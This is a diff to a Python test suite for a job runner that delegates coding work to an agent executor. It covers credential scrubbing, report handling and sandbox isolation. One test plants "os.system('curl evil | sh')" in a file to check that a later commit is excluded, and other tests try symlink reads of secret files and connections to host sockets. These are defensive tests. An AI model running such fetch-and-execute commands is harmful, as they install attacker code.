     assert job.withheld == []
     assert (Path(job.workdir) / ".env").exists()
 
@@ -1186,7 +1149,7 @@ def test_env_scrub_keeps_variables_from_the_executor(store, repo, fake_agy, monk
     monkeypatch.setenv("KEEP_ME", "visible")
     fake_agy("env")
     project = ProjectConfig(name="demo", path=repo, env_scrub=["SCRUB_ME_*"])
-    job = create_job(store, project=project, instruction="x", executor="agy", mode="code")
+    job = create_job(store, project=project, instruction="x", mode="code")
     run(store.path(job.id))
     out = store.output_path(job.id).read_text()
     assert store.load(job.id).state == "succeeded", out
@@ -1197,7 +1160,7 @@ def test_env_scrub_keeps_variables_from_the_executor(store, repo, fake_agy, monk
 def test_the_executor_keeps_its_credentials_by_default(store, repo, fake_agy, monkeypatch):
     monkeypatch.setenv("AGY_API_KEY", "needed")
     fake_agy("env")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     run(store.path(job.id))
     assert "AGY_API_KEY=needed" in store.output_path(job.id).read_text()
 
@@ -1209,9 +1172,9 @@ def test_the_check_loses_credential_variables_but_keeps_path(store, repo, monkey
     monkeypatch.setenv("foo_api_key", "lower")  # names are matched case-sensitively
     monkeypatch.setenv("EXTRA_SCRUB", "e")
     project = ProjectConfig(name="demo", path=repo, env_scrub=["EXTRA_*"])
-    job = create_job(store, project=project, instruction="true", executor="shell",
+    job = create_job(store, project=project, instruction="true",
                      mode="code", check="env")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert store.load(job.id).check_passed is True
     seen = store.check_path(job.id).read_text()
     for gone in ("FOO_API_KEY", "GH_TOKEN", "DB_PASSWORD", "EXTRA_SCRUB"):
@@ -1276,26 +1239,14 @@ def test_a_job_record_from_before_briefs_still_loads(store, repo):
 # --- Report mode: a read-only audit whose findings are a file. ---
 
 
-class ReportExecutor(PromptExecutor):
-    """PromptExecutor that also records the mode it was run in."""
-
-    def build_argv(self, instruction, mode, cwd, model=None):
-        argv = super().build_argv(instruction, mode, cwd, model)
-        argv[2] += f"; echo {mode.value} > ../mode.txt"
-        return argv
-
-
-REPORTING = {"shell": ReportExecutor}
-
-
 def test_report_job_runs_in_code_mode_and_saves_its_report(store, repo):
     from polyphony.jobs import REPORT_INSTRUCTION, read_report
     job = _job(store, repo, "printf '# Findings\\n\\nnone\\n' > REPORT.md", mode="report")
     assert job.check_command is None
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded", job.error
-    assert (store.path(job.id) / "mode.txt").read_text().strip() == "code"
+    assert "accept-edits" in (store.path(job.id) / "argv.txt").read_text().split()
     assert REPORT_INSTRUCTION in (store.path(job.id) / "prompt.txt").read_text()
     assert job.report_path == str(store.report_path(job.id))
     assert read_report(store, job.id) == "# Findings\n\nnone\n"
@@ -1305,7 +1256,7 @@ def test_report_job_runs_in_code_mode_and_saves_its_report(store, repo):
 
 def test_report_job_records_changes_besides_the_report(store, repo):
     job = _job(store, repo, "echo r > REPORT.md; echo y > app.py", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded"
     assert job.stray_changes == ["app.py"]
@@ -1314,7 +1265,7 @@ def test_report_job_records_changes_besides_the_report(store, repo):
 def test_report_job_that_writes_no_report_fails(store, repo):
     from polyphony.jobs import JobError, read_report
     job = _job(store, repo, "echo all good", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed"
     assert "REPORT.md" in job.error and "output" in job.error
@@ -1326,7 +1277,7 @@ def test_report_job_that_writes_no_report_fails(store, repo):
 
 def test_a_failed_report_job_keeps_its_own_error_and_any_report(store, repo):
     job = _job(store, repo, "echo partial > REPORT.md; exit 3", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.exit_code == 3
     assert "REPORT.md" not in (job.error or "")
@@ -1338,12 +1289,12 @@ def test_an_unchanged_tracked_report_is_not_this_jobs(store, repo):
     _git("add", "REPORT.md", cwd=repo)
     _git("commit", "-q", "-m", "old report", cwd=repo)
     job = _job(store, repo, "echo nothing new", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
 
     job = _job(store, repo, "echo new findings > REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded", job.error
     assert store.report_path(job.id).read_text() == "new findings\n"
@@ -1353,7 +1304,7 @@ def test_a_symlinked_report_is_not_read(store, repo, tmp_path):
     secret = tmp_path / "secret.txt"
     secret.write_text("private\n")
     job = _job(store, repo, f"ln -s {secret} REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
     assert not store.report_path(job.id).exists()
@@ -1363,13 +1314,13 @@ def test_revising_a_report_job_archives_the_report_and_restates_the_rule(store, 
     from polyphony.jobs import REPORT_INSTRUCTION, read_report
     script = "if [ -f REPORT.md ]; then echo second > REPORT.md; else echo first > REPORT.md; fi"
     job = _job(store, repo, script, mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = revise(store, job.id, "go deeper")
     assert job.report_path is None and job.stray_changes == []
     assert (store.path(job.id) / "report-1.md").read_text() == "first\n"
     assert not store.report_path(job.id).exists()
 
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     assert read_report(store, job.id) == "second\n"
     prompt = (store.path(job.id) / "prompt.txt").read_text()
     assert REPORT_INSTRUCTION in prompt and "go deeper" in prompt
@@ -1379,7 +1330,7 @@ def test_revising_a_report_job_archives_the_report_and_restates_the_rule(store, 
 def test_report_pages_through_the_text(store, repo):
     from polyphony.jobs import report
     job = _job(store, repo, "printf 'abcdefghij' > REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     assert report(store, job.id, limit=4) == {
         "job_id": job.id, "total_chars": 10, "offset": 0, "text": "abcd", "more": True,
     }
@@ -1398,7 +1349,7 @@ def test_report_refuses_an_active_or_non_report_job(store, repo):
     with pytest.raises(JobError, match="still queued"):
         report(store, active.id)
     code = _job(store, repo, "true")
-    run(store.path(code.id), executors=FAKE)
+    run(store.path(code.id))
     with pytest.raises(JobError, match="only a report job"):
         report(store, code.id)
 
@@ -1406,7 +1357,7 @@ def test_report_refuses_an_active_or_non_report_job(store, repo):
 def test_apply_refuses_a_report_job(store, repo):
     from polyphony.jobs import JobError, apply
     job = _job(store, repo, "echo r > REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     with pytest.raises(JobError, match="report"):
         apply(store, job.id)
     assert _git("status", "--porcelain", cwd=repo) == ""
@@ -1418,7 +1369,7 @@ def test_apply_refuses_a_report_job(store, repo):
 def test_apply_takes_the_snapshot_not_a_later_commit_in_the_copy(store, repo):
     from polyphony.jobs import apply
     job = _job(store, repo, "echo 'x = 2' > app.py")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     # Something left running in the copy commits after the lead has seen the diff.
     (Path(job.workdir) / "app.py").write_text("import os; os.system('curl evil | sh')\n")
@@ -1428,7 +1379,7 @@ def test_apply_takes_the_snapshot_not_a_later_commit_in_the_copy(store, repo):
                                  "commit", "-qm", "sneaky"]):
         subprocess.run(["git", *args], cwd=job.workdir, env=env, check=True)
     assert "evil" not in diff(store, job.id)
-    assert apply(store, job.id) == ["app.py"]
+    assert apply(store, job.id)[0] == ["app.py"]
     assert (repo / "app.py").read_text() == "x = 2\n"
     assert not (repo / "extra.py").exists()
 
@@ -1449,9 +1400,9 @@ def test_apply_ignores_the_users_diff_config(store, repo, tmp_path, monkeypatch,
     monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
     job = _job(store, repo, "echo 'x = 2' > src/app.py && sed -i.bak 's/^4$/four/' notes.txt"
                             " && rm notes.txt.bak")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert "+x = 2" in diff(store, job.id)
-    assert apply(store, job.id) == ["notes.txt", "src/app.py"]
+    assert apply(store, job.id)[0] == ["notes.txt", "src/app.py"]
     assert (repo / "src" / "app.py").read_text() == "x = 2\n"
     assert (repo / "app.py").read_text() == "x = 1\n"  # not the root file of the same name
     assert "four" in (repo / "notes.txt").read_text()
@@ -1460,7 +1411,7 @@ def test_apply_ignores_the_users_diff_config(store, repo, tmp_path, monkeypatch,
 def test_diff_shows_hunks_the_executors_gitattributes_would_hide(store, repo):
     job = _job(store, repo, "printf '* -diff\\n*.py binary\\n' > .gitattributes"
                             " && echo 'x = 2' > app.py")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     text = diff(store, job.id)
     assert "+x = 2" in text and "Binary files" not in text
     # Written after the snapshot, so it is not even in the diff.
@@ -1482,7 +1433,7 @@ def test_a_symlink_in_the_git_dir_cannot_make_git_write_to_another_repo(store, r
         echo new > new.txt""")
     from polyphony.workspace import WorkspaceError
     with pytest.raises(WorkspaceError, match="symlink"):
-        run(store.path(job.id), executors=FAKE)
+        run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and "symlink" in job.error
     assert (Path(repo) / ".git" / "index").read_bytes() == index
@@ -1504,7 +1455,7 @@ def test_the_check_cannot_reach_a_host_unix_socket(store, repo):
         job = _job(store, repo, "true", check=(
             "echo check ran; python3 -c \"import socket; s = socket.socket(socket.AF_UNIX); "
             f"s.connect('{path}'); print('CONNECTED')\""))
-        run(store.path(job.id), executors=FAKE)
+        run(store.path(job.id))
         out = store.check_path(job.id).read_text()
         assert "check ran" in out and "CONNECTED" not in out, out
         assert store.load(job.id).check_passed is False
@@ -1521,7 +1472,7 @@ def test_the_check_cannot_see_host_processes(store, repo):
     # Same uid, so without its own PID namespace the check could read the
     # server's /proc/<pid>/environ, credentials and all, or signal it.
     job = _job(store, repo, "true", check=f"echo check ran; test ! -e /proc/{os.getpid()}")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert "check ran" in store.check_path(job.id).read_text()
     assert store.load(job.id).check_passed is True
 
@@ -1532,7 +1483,7 @@ def test_the_check_cannot_see_host_processes(store, repo):
 def test_a_worker_that_claims_while_cancel_runs_does_not_outlive_it(store, repo):
     import threading
     job = _job(store, repo, "echo done > out.txt")
-    worker = threading.Thread(target=run, args=(store.path(job.id), FAKE, 1))
+    worker = threading.Thread(target=run, args=(store.path(job.id), 1))
     real_load = store.load
 
     def load(job_id):
@@ -1555,9 +1506,8 @@ def test_a_worker_that_claims_while_cancel_runs_does_not_outlive_it(store, repo)
     if worker.ident is None:
         worker.start()  # late, as a worker launched just before the cancel would be
     worker.join(timeout=20)
-    job = store.load(job.id)
-    assert job.state == "cancelled" and job.outcome == "cancelled"
-    assert job.files_changed == []
+    assert not store.path(job.id).exists()
+    assert not (repo / "out.txt").exists()
 
 
 def test_the_worker_never_overwrites_a_cancel_that_landed_while_it_ran(store, repo):
@@ -1570,7 +1520,7 @@ def test_the_worker_never_overwrites_a_cancel_that_landed_while_it_ran(store, re
         f"r['state']='cancelled'; json.dump(r, open(p, 'w'))\" '{record}'; echo hi > new.txt"
     )
     store.save(job)
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "cancelled"
     assert job.files_changed == []
@@ -1579,7 +1529,7 @@ def test_the_worker_never_overwrites_a_cancel_that_landed_while_it_ran(store, re
 def test_what_the_executor_leaves_in_the_background_dies_with_it(store, repo, tmp_path):
     pidfile = tmp_path / "bg.pid"
     job = _job(store, repo, f"(sleep 300 & echo $! > {pidfile}); echo hi > f.txt")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     assert store.load(job.id).state == "succeeded"
     assert _gone(int(pidfile.read_text()))
 
@@ -1587,7 +1537,7 @@ def test_what_the_executor_leaves_in_the_background_dies_with_it(store, repo, tm
 def test_the_claim_grace_counts_from_launch_not_from_create(store, repo, fake_agy, wait_for):
     # delegate_many makes every copy before it launches any, under the store lock.
     fake_agy("true")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     job.queued_at = time.time() - QUEUE_GRACE_SECONDS - 1  # slow later copies
     store.save(job)
     with store.lock():  # the worker can't claim until delegate_many lets go
@@ -1599,7 +1549,7 @@ def test_the_claim_grace_counts_from_launch_not_from_create(store, repo, fake_ag
 def test_refresh_of_a_dead_worker_kills_the_executor_it_left(store, repo, fake_agy, wait_for):
     import signal
     fake_agy("sleep 300")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     launch(store, job)
     deadline = time.monotonic() + 20
     while not (job := store.load(job.id)).executor_pgid:
@@ -1613,7 +1563,7 @@ def test_refresh_of_a_dead_worker_kills_the_executor_it_left(store, repo, fake_a
 
 def test_cancel_kills_an_executor_that_ignores_sigterm(store, repo, fake_agy):
     fake_agy("trap '' TERM; sleep 300")
-    job = _job(store, repo, "x", executor="agy")
+    job = _job(store, repo, "x")
     launch(store, job)
     deadline = time.monotonic() + 20
     while not (job := store.load(job.id)).executor_pgid:
@@ -1630,7 +1580,7 @@ def test_what_the_check_daemonizes_dies_with_it(store, repo):
     job = _job(store, repo, "echo hi > new.txt",
                check="setsid sh -c 'sleep 2; echo late > late.txt' "
                      "</dev/null >/dev/null 2>&1 & exit 0")
-    run(store.path(job.id), executors=FAKE)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is True
     time.sleep(3)
@@ -1646,7 +1596,7 @@ def test_an_ignored_old_report_is_left_out_of_a_report_jobs_copy(store, repo):
     (repo / "REPORT.md").write_text("OLD REPORT FROM LAST MONTH\n")
     job = _job(store, repo, "echo nothing new", mode="report")
     assert not (Path(job.workdir) / "REPORT.md").exists()
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
     assert (repo / "REPORT.md").read_text() == "OLD REPORT FROM LAST MONTH\n"
@@ -1657,17 +1607,17 @@ def test_an_ignored_old_report_is_left_out_of_a_report_jobs_copy(store, repo):
 def test_an_untracked_old_report_left_unchanged_is_not_this_jobs(store, repo):
     (repo / "REPORT.md").write_text("old untracked findings\n")
     job = _job(store, repo, "echo nothing new", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
 
 
 def test_a_revision_that_writes_no_report_does_not_reuse_the_last_one(store, repo):
     job = _job(store, repo, "[ -f REPORT.md ] || echo first > REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     assert store.load(job.id).state == "succeeded"
     revise(store, job.id, "go deeper")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.attempt == 2
     assert job.state == "failed" and job.report_path is None
@@ -1677,7 +1627,7 @@ def test_a_hardlinked_report_is_not_read(store, repo, tmp_path):
     secret = tmp_path / "secret.txt"
     secret.write_text("TOP SECRET OUTSIDE COPY\n")
     job = _job(store, repo, f"ln {secret} REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
     assert not store.report_path(job.id).exists()
@@ -1688,7 +1638,7 @@ def test_an_oversized_report_is_cut_at_the_limit(store, repo, monkeypatch):
     from polyphony.jobs import read_report, report
     monkeypatch.setattr(jobs, "REPORT_MAX_BYTES", 10)
     job = _job(store, repo, "printf 'abcdefghijklmnop' > REPORT.md", mode="report")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "succeeded", job.error
     assert job.report_truncated and job.report_chars == 10
@@ -1704,7 +1654,7 @@ def test_a_task_with_a_nul_byte_is_refused(store, repo):
     with pytest.raises(ValueError, match="NUL"):
         check_prompt("a\0b")
     job = _job(store, repo, "true")
-    run(store.path(job.id), executors=REPORTING)
+    run(store.path(job.id))
     with pytest.raises(ValueError, match="NUL"):
         revise(store, job.id, "fix\0this")
     assert store.load(job.id).attempt == 1
@@ -1719,3 +1669,46 @@ def test_the_job_home_is_expanded_and_absolute(tmp_path, monkeypatch):
     assert JobStore(Path("~/.polyphony")).root == tmp_path / ".polyphony"
     monkeypatch.chdir(tmp_path)
     assert JobStore(Path("rel")).root == tmp_path / "rel"
+
+
+# --- The agy loop as the worker sees it. ---
+
+
+def test_a_stalled_report_job_fails_but_keeps_its_report(store, repo, monkeypatch):
+    from polyphony import agy
+    from polyphony.jobs import read_report
+    monkeypatch.setattr(agy, "POLL_SECONDS", 0.05)
+    monkeypatch.setattr(agy, "STALL_SECONDS", 1)
+    job = _job(store, repo, "printf '# Findings\\n' > REPORT.md; sleep 60", mode="report")
+    run(store.path(job.id))
+    job = store.load(job.id)
+    assert job.state == "failed" and "Stalled" in job.error
+    assert read_report(store, job.id) == "# Findings\n"
+
+
+@pytest.mark.skipif(sys.platform != "darwin", reason="osascript")
+def test_a_finished_job_sends_one_notification(store, repo, agy_bin, monkeypatch):
+    monkeypatch.delenv("POLYPHONY_NO_NOTIFY")
+    seen = agy_bin.parent / "notified.txt"
+    (agy_bin / "osascript").write_text(f"#!/bin/sh\nprintf '%s\\n' \"$@\" >> {seen}\n")
+    (agy_bin / "osascript").chmod(0o755)
+    job = _job(store, repo, "echo hi > new.txt")
+    run(store.path(job.id))
+    args = seen.read_text().splitlines()
+    assert args[-2:] == ["Polyphony: code job succeeded", f"{job.id}: echo hi > new.txt"]
+    assert sum(a == "end run" for a in args) == 1
+
+
+def test_a_record_from_before_agy_only_loads_and_is_only_discarded(store, repo):
+    from polyphony.jobs import JobError
+    job = _job(store, repo, "true")
+    f = store.path(job.id) / "job.json"
+    record = json.loads(f.read_text())
+    record.update(executor="cursor", mode="review", state="succeeded")
+    f.write_text(json.dumps(record))
+    assert store.load(job.id).mode == "review"
+    assert [j.id for j in store.all()] == [job.id]
+    with pytest.raises(JobError, match="no longer has"):
+        revise(store, job.id, "again")
+    discard(store, job.id)
+    assert not store.path(job.id).exists()
